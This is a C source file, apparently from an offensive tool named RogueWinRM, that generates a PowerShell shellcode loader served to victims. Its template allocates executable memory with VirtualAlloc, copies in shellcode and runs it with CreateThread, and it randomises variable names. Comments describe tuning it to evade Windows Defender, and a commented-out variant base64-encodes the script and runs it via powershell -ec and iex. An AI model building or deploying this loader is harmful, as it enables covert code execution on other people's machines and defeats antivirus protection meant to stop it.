/**
	This module is responsible of the creation of a powershell payload based on the shellcode
	provided by main or dllmain (main/dllmain -> RunRogueWinRM -> generate_powershell_payload)
	This powershell payload will be served by psDeliveryService.c
*/

#include "pch.h"

/* This module involve the creation of random string with random length.
The following preprocessor constants define the min and max length of these strings.*/
#define RANDSTRING_LOWER 3
#define RANNDSTRIG_UPPER 8



/**
	Entry point of this module. A powershell template script is provided by the variable
	template[]. This variable contains keywords which will be replaced by variable name
	or by the formated shellcode in order to get a fully funtionnal powershell script.

	@param		char* shellcode		Address of shellcode provided by main/dllmain
									(main/dllmain -> RunRogueWinRM -> generate_powershell_payload)

	@return		char*				The addres of the powershell payload allocated in heap.
									NULL if calloc fails.
 */
char* generate_powershell_payload(char* shellcode)
{
	const char template[] =
		"$<<<RANDVAR1>>> = @'\n"
		"[DllImport(\"kernel32.dll\")]\n"
		"public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n"
		"[DllImport(\"kernel32.dll\")]\n"
		"public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n"
		"[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);\n"
		"'@\n"
		"$w = Add-Type -memberDefinition $<<<RANDVAR1>>> -Name \"Win32\" -namespace Win32Functions -passthru\n"
		"[Byte[]]\n"
		"[Byte[]]$z = <<<SHELLCODE>>>\n"
		"$g = 0x1000\n"
		"if ($z.Length -gt 0x1000){$g = $z.Length}\n"
		"$<<<RANDVAR2>>>=$w::VirtualAlloc(0,0x1000,$g,0x40)\n"
		"for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($<<<RANDVAR2>>>.ToInt32()+$i), $z[$i], 1)}\n"
		"Start-sleep 3\n"	// For bypassing behavior based detection. Success rate of 1/2 with Windows defender. Need to find better payloads.
		"$w::CreateThread(0,0,$<<<RANDVAR2>>>,0,0,0)\n"
		"for (;;){Start-sleep 30; Start-sleep 30;}\n"; // for (;;){Start-sleep 60} is flagged by Windows Defender
	char randVar1[RANNDSTRIG_UPPER + 1];
	char randVar2[RANNDSTRIG_UPPER + 1];
	char* formated_shellcode = NULL;
	unsigned short length = 1 * (unsigned short)strlen(template) + 1;
	char* powershell_payload = calloc(length, sizeof(char));

	if (!powershell_payload)
		return NULL;

	strcpy_s(powershell_payload, length, template);

	randstring(randVar1);
	randstring(randVar2);

	formated_shellcode = format_shellcode(shellcode);  // Example : change "\x73\x9d\xf4" into "0x73,0x9d,0xf4"
	if (!formated_shellcode)
		return NULL;

	// repl_str = Replace String. Example : Change "<<<SHELLCODE>>>" into "0x73,0x9d,0xf4".
	powershell_payload = repl_str(powershell_payload, "<<<SHELLCODE>>>", formated_shellcode);
	free(formated_shellcode);
	formated_shellcode = NULL;

	powershell_payload = repl_str(powershell_payload, "<<<RANDVAR1>>>", randVar1);
	powershell_payload = repl_str(powershell_payload, "<<<RANDVAR2>>>", randVar2);

	return powershell_payload; // powershell_payload may be NULL if allocation fails somewhere
}



/**
	Change shellcode byte into powershell readable string shellcode. Example : change "\x73\x9d\xf4" into "0x73,0x9d,0xf4"

	@param		char* shellcode		Address of shellcode provided by main/dllmain
									(main/dllmain -> RunRogueWinRM -> generate_powershell_payload -> format_shellcode)

	@return		char*				The address of the powershell readable string shellcode
									NULL if calloc fails.
 */
static char* format_shellcode(char* shellcode)
{
	const char conversion_table[256][5] =
	{
		"0x00\0", "0x01\0", "0x02\0", "0x03\0", "0x04\0", "0x05\0", "0x06\0", "0x07\0", "0x08\0", "0x09\0", "0x0a\0", "0x0b\0", "0x0c\0", "0x0d\0", "0x0e\0", "0x0f\0",
		"0x10\0", "0x11\0", "0x12\0", "0x13\0", "0x14\0", "0x15\0", "0x16\0", "0x17\0", "0x18\0", "0x19\0", "0x1a\0", "0x1b\0", "0x1c\0", "0x1d\0", "0x1e\0", "0x1f\0",
		"0x20\0", "0x21\0", "0x22\0", "0x23\0", "0x24\0", "0x25\0", "0x26\0", "0x27\0", "0x28\0", "0x29\0", "0x2a\0", "0x2b\0", "0x2c\0", "0x2d\0", "0x2e\0", "0x2f\0",
		"0x30\0", "0x31\0", "0x32\0", "0x33\0", "0x34\0", "0x35\0", "0x36\0", "0x37\0", "0x38\0", "0x39\0", "0x3a\0", "0x3b\0", "0x3c\0", "0x3d\0", "0x3e\0", "0x3f\0",
		"0x40\0", "0x41\0", "0x42\0", "0x43\0", "0x44\0", "0x45\0", "0x46\0", "0x47\0", "0x48\0", "0x49\0", "0x4a\0", "0x4b\0", "0x4c\0", "0x4d\0", "0x4e\0", "0x4f\0",
		"0x50\0", "0x51\0", "0x52\0", "0x53\0", "0x54\0", "0x55\0", "0x56\0", "0x57\0", "0x58\0", "0x59\0", "0x5a\0", "0x5b\0", "0x5c\0", "0x5d\0", "0x5e\0", "0x5f\0",
		"0x60\0", "0x61\0", "0x62\0", "0x63\0", "0x64\0", "0x65\0", "0x66\0", "0x67\0", "0x68\0", "0x69\0", "0x6a\0", "0x6b\0", "0x6c\0", "0x6d\0", "0x6e\0", "0x6f\0",
		"0x70\0", "0x71\0", "0x72\0", "0x73\0", "0x74\0", "0x75\0", "0x76\0", "0x77\0", "0x78\0", "0x79\0", "0x7a\0", "0x7b\0", "0x7c\0", "0x7d\0", "0x7e\0", "0x7f\0",
		"0x80\0", "0x81\0", "0x82\0", "0x83\0", "0x84\0", "0x85\0", "0x86\0", "0x87\0", "0x88\0", "0x89\0", "0x8a\0", "0x8b\0", "0x8c\0", "0x8d\0", "0x8e\0", "0x8f\0",
		"0x90\0", "0x91\0", "0x92\0", "0x93\0", "0x94\0", "0x95\0", "0x96\0", "0x97\0", "0x98\0", "0x99\0", "0x9a\0", "0x9b\0", "0x9c\0", "0x9d\0", "0x9e\0", "0x9f\0",
		"0xa0\0", "0xa1\0", "0xa2\0", "0xa3\0", "0xa4\0", "0xa5\0", "0xa6\0", "0xa7\0", "0xa8\0", "0xa9\0", "0xaa\0", "0xab\0", "0xac\0", "0xad\0", "0xae\0", "0xaf\0",
		"0xb0\0", "0xb1\0", "0xb2\0", "0xb3\0", "0xb4\0", "0xb5\0", "0xb6\0", "0xb7\0", "0xb8\0", "0xb9\0", "0xba\0", "0xbb\0", "0xbc\0", "0xbd\0", "0xbe\0", "0xbf\0",
		"0xc0\0", "0xc1\0", "0xc2\0", "0xc3\0", "0xc4\0", "0xc5\0", "0xc6\0", "0xc7\0", "0xc8\0", "0xc9\0", "0xca\0", "0xcb\0", "0xcc\0", "0xcd\0", "0xce\0", "0xcf\0",
		"0xd0\0", "0xd1\0", "0xd2\0", "0xd3\0", "0xd4\0", "0xd5\0", "0xd6\0", "0xd7\0", "0xd8\0", "0xd9\0", "0xda\0", "0xdb\0", "0xdc\0", "0xdd\0", "0xde\0", "0xdf\0",
		"0xe0\0", "0xe1\0", "0xe2\0", "0xe3\0", "0xe4\0", "0xe5\0", "0xe6\0", "0xe7\0", "0xe8\0", "0xe9\0", "0xea\0", "0xeb\0", "0xec\0", "0xed\0", "0xee\0", "0xef\0",
		"0xf0\0", "0xf1\0", "0xf2\0", "0xf3\0", "0xf4\0", "0xf5\0", "0xf6\0", "0xf7\0", "0xf8\0", "0xf9\0", "0xfa\0", "0xfb\0", "0xfc\0", "0xfd\0", "0xfe\0", "0xff\0"
	};
	unsigned short length = 5 * (unsigned short)strlen(shellcode) + 1;	// Example : the char "A" ("\xd9") (1 byte) will be converted to char[] "0x41," (5 bytes) + final null double byte so 5 + 1 bytes.
	char* byte_address = shellcode;
	char shellcode_byte = *byte_address;
	char* formated_shellcode = calloc(length, sizeof(char));


	if (!formated_shellcode)
		return NULL;

	/* While we don't reach the end of shellcode (null bytes are forbidden), increment the pointer pointing to current
	byte, and use the value of that byte to reach the corresponding string in conversion_table. Then, puts this
	corresponding string (without its null byte) into formated_shellcode buffer.*/
	while (shellcode_byte != 0)
	{
		strcat_s(formated_shellcode, length, conversion_table[(unsigned char)shellcode_byte]);
		strcat_s(formated_shellcode, length, ",");
		byte_address++;
		shellcode_byte = *byte_address;
	}

	length = (unsigned short)strlen(formated_shellcode);
	if (length > 0)
		formated_shellcode[length - 1] = '\0';  // Removing last char which is a ","
	else
		return NULL;

	return formated_shellcode;
}




/**
	Generate a random string of random length comprised between RANDSTRING_LOWER and RANNDSTRIG_UPPER.
	This random string will be used as random variable names in powershell script.

	@param		char* randomString	address of the buffer which will receive the random string

	@return		int					error code. 0 for success.
 */
static int randstring(char* randomString)
{
	const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	const unsigned char upper = RANNDSTRIG_UPPER;
	const unsigned char lower = RANDSTRING_LOWER;
	unsigned char length = 0;
	unsigned int mySeed = (unsigned int)time(NULL);
	static unsigned int increment = 0;
	unsigned char stringLen = (unsigned char)strlen(charset);
	unsigned char n = 0;
	char key = 0;

	srand(mySeed + ++increment);
	length = (rand() % (upper - lower + 1)) + lower;  // https://www.geeksforgeeks.org/generating-random-number-range-c/

	for (n = 0; n < length; n++)
	{
		key = rand() % stringLen;
		randomString[n] = charset[key];
	}

	randomString[length] = '\0';

	return 0;
}



/**
	repl_str = Replace String. Replace all occurences of a substring in a string by a
	replacement string. For instance, change "<<<SHELLCODE>>>" into "0x73,0x9d,0xf4" in
	a whole template. Here is the source of the funtion :
	https://creativeandcritical.net/str-replace-c

	@param		char*		str		address of the source string
	@param		const char* from	address of the string which should be searched/replaced
	@param		const char* to		address of the string which serve as replacemennt

	@return		char*				address of the whole string with all occurences replaced
 */
static char* repl_str(char* str, const char* from, const char* to)
{
	/* Adjust each of the below values to suit your needs. */

	/* Increment positions cache size initially by this number. */
	size_t cache_sz_inc = 16;
	/* Thereafter, each time capacity needs to be increased,
	 * multiply the increment by this factor. */
	const size_t cache_sz_inc_factor = 3;
	/* But never increment capacity by more than this number. */
	const size_t cache_sz_inc_max = 1048576;

	char* pret, * ret = NULL;
	const char* pstr2, * pstr = str;
	size_t i, count = 0;
#if (__STDC_VERSION__ >= 199901L)
	uintptr_t* pos_cache_tmp, * pos_cache = NULL;
#else
	ptrdiff_t* pos_cache_tmp, * pos_cache = NULL;
#endif
	size_t cache_sz = 0;
	size_t cpylen, orglen, retlen, tolen, fromlen = strlen(from);

	/* Find all matches and cache their positions. */
	while ((pstr2 = strstr(pstr, from)) != NULL) {
		count++;

		/* Increase the cache size when necessary. */
		if (cache_sz < count) {
			cache_sz += cache_sz_inc;
			pos_cache_tmp = realloc(pos_cache, sizeof(*pos_cache) * cache_sz);
			if (pos_cache_tmp == NULL) {
				goto end_repl_str;
			}
			else pos_cache = pos_cache_tmp;
			cache_sz_inc *= cache_sz_inc_factor;
			if (cache_sz_inc > cache_sz_inc_max) {
				cache_sz_inc = cache_sz_inc_max;
			}
		}

		pos_cache[count - 1] = pstr2 - str;
		pstr = pstr2 + fromlen;
	}

	orglen = pstr - str + strlen(pstr);

	/* Allocate memory for the post-replacement string. */
	if (count > 0)
	{
		tolen = strlen(to);
		retlen = orglen + (tolen - fromlen) * count;
	}
	else	retlen = orglen;
	//ret = malloc(retlen + 1);
	ret = calloc(retlen + 1, sizeof(char));
	if (ret == NULL)
	{
		goto end_repl_str;
	}

	if (count == 0)
	{
		/* If no matches, then just duplicate the string. */
		strcpy_s(ret, (retlen + 1) * sizeof(char), str);
	}
	else
	{
		/* Otherwise, duplicate the string whilst performing
		 * the replacements using the position cache. */
		pret = ret;
		memcpy(pret, str, pos_cache[0]);
		pret += pos_cache[0];
		for (i = 0; i < count; i++) {
			memcpy(pret, to, tolen);
			pret += tolen;
			pstr = str + pos_cache[i] + fromlen;
			cpylen = (i == count - 1 ? orglen : pos_cache[i + 1]) - pos_cache[i] - fromlen;
			memcpy(pret, pstr, cpylen);
			pret += cpylen;
		}
		ret[retlen] = '\0';
	}

end_repl_str:
	/* Free the cache and return the post-replacement string,
	 * which will be NULL in the event of an error. */
	free(pos_cache);
	pos_cache = NULL;
	pos_cache_tmp = NULL;
	free(str);
	return ret;
}




//*The following alternnative function work, but get caught by Windows Defender. */

/*char* generate_powershell_payload2(char* shellcode)
{
	const wchar_t template[] = L"$<<<RANDVAR1>>> = '$<<<RANDVAR2>>> = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $<<<RANDVAR2>>> -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = <<<SHELLCODE>>>;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$<<<RANDVAR5>>>=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($<<<RANDVAR5>>>.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$<<<RANDVAR5>>>,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($<<<RANDVAR1>>>));$<<<RANDVAR3>>> = \"-ec \";if([IntPtr]::Size -eq 8){$<<<RANDVAR4>>> = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \" & $<<<RANDVAR4>>> $<<<RANDVAR3>>> $e\"}else{;iex \"& powershell $<<<RANDVAR3>>> $e\";}";
	const char template2[] = "powershell -w 1 -C \"sv iHD - ; sv z ec; sv Nla((gv iHD).value.toString() + (gv z).value.toString()); powershell(gv Nla).value.toString() '";
	unsigned short index = 0;
	unsigned short powershell_payload_len = 0;
	unsigned short length = 2 * (unsigned short)wcslen(template) + 2; // Don't understand why �_�
	char* b64_ps_encoded = NULL;
	char* pointer_to_powershell_script_as_char = NULL;
	char* powershell_payload = NULL;
	wchar_t randVar1[RANNDSTRIG_UPPER + 1];
	wchar_t randVar2[RANNDSTRIG_UPPER + 1];
	wchar_t randVar3[RANNDSTRIG_UPPER + 1];
	wchar_t randVar4[RANNDSTRIG_UPPER + 1];
	wchar_t randVar5[RANNDSTRIG_UPPER + 1];
	wchar_t* formated_shellcode = NULL;
	wchar_t* code_buffer = calloc(length, sizeof(wchar_t));

	if (!code_buffer)
		return NULL;

	wcscpy_s(code_buffer, length, template);

	randstring2(randVar1);
	randstring2(randVar2);
	randstring2(randVar3);
	randstring2(randVar4);
	randstring2(randVar5);

	formated_shellcode = format_shellcode2(shellcode);
	if (!formated_shellcode)
		return NULL;

	code_buffer = repl_wcs(code_buffer, L"<<<SHELLCODE>>>", formated_shellcode);
	free(formated_shellcode);
	formated_shellcode = NULL;

	code_buffer = repl_wcs(code_buffer, L"<<<RANDVAR1>>>", randVar1);
	code_buffer = repl_wcs(code_buffer, L"<<<RANDVAR2>>>", randVar2);
	code_buffer = repl_wcs(code_buffer, L"<<<RANDVAR3>>>", randVar3);
	code_buffer = repl_wcs(code_buffer, L"<<<RANDVAR4>>>", randVar4);
	code_buffer = repl_wcs(code_buffer, L"<<<RANDVAR5>>>", randVar5);

	pointer_to_powershell_script_as_char = (char*)code_buffer;
	b64_ps_encoded = base64_encode(pointer_to_powershell_script_as_char, (unsigned short)wcslen(code_buffer) * sizeof(wchar_t), &length);
	free(code_buffer);
	code_buffer = NULL;

	powershell_payload_len += (unsigned short)strlen(template2) + (unsigned short)strlen(b64_ps_encoded) + 3;
	powershell_payload = calloc(1, powershell_payload_len + 1);
	if (powershell_payload)
	{
		strcat_s(powershell_payload, powershell_payload_len, template2);
		strcat_s(powershell_payload, powershell_payload_len, b64_ps_encoded);
		strcat_s(powershell_payload, powershell_payload_len, "'\"\0");

		free(b64_ps_encoded);
		b64_ps_encoded = NULL;

		return powershell_payload;
	}
	else
		return NULL;
}



static wchar_t* format_shellcode2(char* shellcode) //, wchar_t* formated_shellcode)
{
	const wchar_t conversion_table[256][8] =
	{
		L"0x00", L"0x01", L"0x02", L"0x03", L"0x04", L"0x05", L"0x06", L"0x07", L"0x08", L"0x09", L"0x0a", L"0x0b", L"0x0c", L"0x0d", L"0x0e", L"0x0f",
		L"0x10", L"0x11", L"0x12", L"0x13", L"0x14", L"0x15", L"0x16", L"0x17", L"0x18", L"0x19", L"0x1a", L"0x1b", L"0x1c", L"0x1d", L"0x1e", L"0x1f",
		L"0x20", L"0x21", L"0x22", L"0x23", L"0x24", L"0x25", L"0x26", L"0x27", L"0x28", L"0x29", L"0x2a", L"0x2b", L"0x2c", L"0x2d", L"0x2e", L"0x2f",
		L"0x30", L"0x31", L"0x32", L"0x33", L"0x34", L"0x35", L"0x36", L"0x37", L"0x38", L"0x39", L"0x3a", L"0x3b", L"0x3c", L"0x3d", L"0x3e", L"0x3f",
		L"0x40", L"0x41", L"0x42", L"0x43", L"0x44", L"0x45", L"0x46", L"0x47", L"0x48", L"0x49", L"0x4a", L"0x4b", L"0x4c", L"0x4d", L"0x4e", L"0x4f",
		L"0x50", L"0x51", L"0x52", L"0x53", L"0x54", L"0x55", L"0x56", L"0x57", L"0x58", L"0x59", L"0x5a", L"0x5b", L"0x5c", L"0x5d", L"0x5e", L"0x5f",
		L"0x60", L"0x61", L"0x62", L"0x63", L"0x64", L"0x65", L"0x66", L"0x67", L"0x68", L"0x69", L"0x6a", L"0x6b", L"0x6c", L"0x6d", L"0x6e", L"0x6f",
		L"0x70", L"0x71", L"0x72", L"0x73", L"0x74", L"0x75", L"0x76", L"0x77", L"0x78", L"0x79", L"0x7a", L"0x7b", L"0x7c", L"0x7d", L"0x7e", L"0x7f",
		L"0x80", L"0x81", L"0x82", L"0x83", L"0x84", L"0x85", L"0x86", L"0x87", L"0x88", L"0x89", L"0x8a", L"0x8b", L"0x8c", L"0x8d", L"0x8e", L"0x8f",
		L"0x90", L"0x91", L"0x92", L"0x93", L"0x94", L"0x95", L"0x96", L"0x97", L"0x98", L"0x99", L"0x9a", L"0x9b", L"0x9c", L"0x9d", L"0x9e", L"0x9f",
		L"0xa0", L"0xa1", L"0xa2", L"0xa3", L"0xa4", L"0xa5", L"0xa6", L"0xa7", L"0xa8", L"0xa9", L"0xaa", L"0xab", L"0xac", L"0xad", L"0xae", L"0xaf",
		L"0xb0", L"0xb1", L"0xb2", L"0xb3", L"0xb4", L"0xb5", L"0xb6", L"0xb7", L"0xb8", L"0xb9", L"0xba", L"0xbb", L"0xbc", L"0xbd", L"0xbe", L"0xbf",
		L"0xc0", L"0xc1", L"0xc2", L"0xc3", L"0xc4", L"0xc5", L"0xc6", L"0xc7", L"0xc8", L"0xc9", L"0xca", L"0xcb", L"0xcc", L"0xcd", L"0xce", L"0xcf",
		L"0xd0", L"0xd1", L"0xd2", L"0xd3", L"0xd4", L"0xd5", L"0xd6", L"0xd7", L"0xd8", L"0xd9", L"0xda", L"0xdb", L"0xdc", L"0xdd", L"0xde", L"0xdf",
		L"0xe0", L"0xe1", L"0xe2", L"0xe3", L"0xe4", L"0xe5", L"0xe6", L"0xe7", L"0xe8", L"0xe9", L"0xea", L"0xeb", L"0xec", L"0xed", L"0xee", L"0xef",
		L"0xf0", L"0xf1", L"0xf2", L"0xf3", L"0xf4", L"0xf5", L"0xf6", L"0xf7", L"0xf8", L"0xf9", L"0xfa", L"0xfb", L"0xfc", L"0xfd", L"0xfe", L"0xff"
	};
	unsigned int length = 5 * strlen(shellcode) + 13;	// Example : the char "A" ("\xd9") (1 byte) will be converted to wchar_t "0x41," (10 bytes) + final double null double byte so 10 + 2 bytes.
	unsigned int index = 0;
	char* byte_address = shellcode;
	char shellcode_byte = *byte_address;
	wchar_t* formated_shellcode = calloc(length, sizeof(wchar_t));

	if (!formated_shellcode)
		return NULL;

	ZeroMemory(formated_shellcode, length * sizeof(wchar_t));
	while (shellcode_byte != 0)
	{

		wcscat_s(formated_shellcode, length, conversion_table[(unsigned char)shellcode_byte]);
		wcscat_s(formated_shellcode, length, L",");
		byte_address++;
		shellcode_byte = *byte_address;
	}

	length = wcslen(formated_shellcode);
	if (length > 0)
		formated_shellcode[length - 1] = L'\0';  // Removing last wchar which is a L","
	else
		exit(1);

	return formated_shellcode;
}



// Source : https://creativeandcritical.net/str-replace-c
static wchar_t* repl_wcs(wchar_t* str, const wchar_t* from, const wchar_t* to)
{
	// Adjust each of the below values to suit your needs.

	// Increment positions cache size initially by this number.
	size_t cache_sz_inc = 16;
	// Thereafter, each time capacity needs to be increased,
	// multiply the increment by this factor.
	const size_t cache_sz_inc_factor = 3;
	// But never increment capacity by more than this number.
	const size_t cache_sz_inc_max = 1048576;

	wchar_t* pret, * ret = NULL;
	const wchar_t* pstr2, * pstr = str;
	size_t i, count = 0;
#if (__STDC_VERSION__ >= 199901L)
	uintptr_t* pos_cache_tmp, * pos_cache = NULL;
#else
	ptrdiff_t* pos_cache_tmp, * pos_cache = NULL;
#endif
	size_t cache_sz = 0;
	size_t cpylen, orglen, retlen, tolen, fromlen = wcslen(from);

	// Find all matches and cache their positions.
	while ((pstr2 = wcsstr(pstr, from)) != NULL)
	{
		count++;

		// Increase the cache size when necessary.
		if (cache_sz < count)
		{
			cache_sz += cache_sz_inc;
			pos_cache_tmp = realloc(pos_cache, sizeof(*pos_cache) * cache_sz);
			if (pos_cache_tmp == NULL)
			{
				goto end_repl_wcs;
			}
			else pos_cache = pos_cache_tmp;
			cache_sz_inc *= cache_sz_inc_factor;
			if (cache_sz_inc > cache_sz_inc_max)
			{
				cache_sz_inc = cache_sz_inc_max;
			}
		}

		pos_cache[count - 1] = pstr2 - str;
		pstr = pstr2 + fromlen;
	}

	orglen = pstr - str + wcslen(pstr);

	// Allocate memory for the post-replacement string.
	if (count > 0)
	{
		tolen = wcslen(to);
		retlen = orglen + (tolen - fromlen) * count;
	}
	else	retlen = orglen;
	ret = calloc((retlen + 1), sizeof(wchar_t));
	if (ret == NULL)
	{
		goto end_repl_wcs;
	}

	if (count == 0)
	{
		// If no matches, then just duplicate the string.
		wcscpy_s(ret, (retlen + 1) * sizeof(wchar_t), str);
	}
	else
	{
		// Otherwise, duplicate the string whilst performing
		// the replacements using the position cache.
		pret = ret;
		wmemcpy(pret, str, pos_cache[0]);
		pret += pos_cache[0];
		for (i = 0; i < count; i++)
		{
			wmemcpy(pret, to, tolen);
			pret += tolen;
			pstr = str + pos_cache[i] + fromlen;
			cpylen = (i == count - 1 ? orglen : pos_cache[i + 1]) - pos_cache[i] - fromlen;
			wmemcpy(pret, pstr, cpylen);
			pret += cpylen;
		}
		ret[retlen] = L'\0';
	}

end_repl_wcs:
	// Free the cache and return the post-replacement string,
	// which will be NULL in the event of an error.
	free(pos_cache);
	pos_cache = NULL;
	pos_cache_tmp = NULL;
	free(str);
	return ret;
}



static int randstring2(wchar_t* randomString)
{
	const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	const unsigned char upper = RANNDSTRIG_UPPER;
	const unsigned char lower = randstring2_LOWER;
	unsigned char length = 0;
	unsigned int mySeed = (unsigned int)time(NULL);
	static unsigned int increment = 0;
	unsigned char stringLen = (unsigned char)wcslen(charset);
	unsigned char n = 0;
	char key = 0;

	srand(mySeed + ++increment);
	length = (rand() % (upper - lower + 1)) + lower;  // https://www.geeksforgeeks.org/generating-random-number-range-c/

	for (n = 0; n < length; n++)
	{
		key = rand() % stringLen;
		randomString[n] = charset[key];
	}

	randomString[length] = '\0';

	return 0;
}*/
